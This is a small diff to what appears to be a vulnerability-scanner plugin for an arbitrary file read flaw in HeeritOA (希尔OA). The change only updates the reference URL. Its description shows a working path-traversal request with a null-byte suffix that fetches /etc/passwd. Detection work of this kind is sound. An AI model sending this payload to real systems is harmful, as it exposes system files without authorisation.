@@ -15,7 +15,7 @@ class Vuln(ABVuln):
         HeeritOA(希尔OA)系统通用型任意文件读取漏洞。
         /bnuoa/info/infoShowAction.do?accessory=1&id=../../../../../../../../../../etc/passwd%00.jpg&method=getAccessory
     '''  # 漏洞描述
-    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=058386
+    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=058386'  # 漏洞来源
     cnvd_id = 'Unknown'  # cnvd漏洞编号
     cve_id = 'Unknown'  # cve编号
     product = 'HeeritOA(希尔OA)'  # 漏洞应用名称
